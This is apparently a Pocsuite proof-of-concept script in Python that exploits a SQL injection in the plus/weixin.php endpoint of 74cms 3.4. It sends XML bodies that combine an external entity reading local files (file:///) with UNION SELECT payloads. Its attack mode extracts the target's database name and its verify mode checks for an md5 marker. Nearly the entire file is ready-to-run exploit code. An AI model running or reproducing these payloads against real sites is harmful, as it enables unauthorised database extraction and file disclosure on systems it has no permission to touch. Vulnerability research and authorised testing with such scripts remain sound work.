#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import time
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    name = '74cms 3.4  plus/weixin.php sql injection'
    vulID = '0'
    author = ['LRestless']
    vulType = 'sql-inj'
    version = '1'
    references = ['https://shuimugan.com/bug/view?bug_no=68941']
    desc = '''74cms 3.4  plus/weixin.php sql injection'''

    vulDate = '2014-10-16'
    createDate = '2019-04-02'
    updateDate = '2019-04-02'

    appName = '74cms'
    appVersion = '3.4'
    appPowerLink = 'http://www.74cms.com'
    samples = ['re']

    def _attack(self):
        """attack mode"""
        result = {}
        s = req.Session()
        s.get(self.url)
        self.url = self.url.strip('/') + "/plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709&timestamp=&nonce="
        data = """<?xml version="1.0" encoding="utf-8"?>
            <!DOCTYPE copyright [
            <!ENTITY test SYSTEM "file:///">
            ]>
            <xml>
            <ToUserName>&test;</ToUserName>
            <FromUserName>1111</FromUserName>
            <Content>2222' union select concat(0x7e,database(),0x7e) #</Content>
            <Event>3333</Event>
            </xml>
        """
        header = {
            'Content-Type': 'text/xml'
        }
        resp1 = s.post(self.url, headers=header, data=data)
        dbname1 = re.search('~(.*?)~', resp1.content)
        if dbname1:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['Database'] = {}
            result['Database']['DBname'] = dbname1.group(1)
        return self.parse_output(result)

    def _verify(self):
        """verify  mode"""
        result = {}
        s = req.Session()
        s.get(self.url)
        self.url = self.url.strip('/') + "/plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709&timestamp=&nonce="
        data = """<?xml version="1.0" encoding="utf-8"?>
            <!DOCTYPE copyright [
            <!ENTITY test SYSTEM "file:///F:/wwwroot/Apache2/htdocs/74cms/robots.txt">
            ]>
            <xml>
            <ToUserName>&test;</ToUserName>
            <FromUserName>1111</FromUserName>
            <Content>2222' union select md5(1) #</Content>
            <Event>3333</Event>
            </xml>
        """
        header = {
            'Content-Type': 'text/xml'
        }
        resp1 = s.post(self.url, headers=header, data=data)
        time.sleep(2)
        if '(c4ca4238a0b923820dcc509a6f75849' in resp1.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

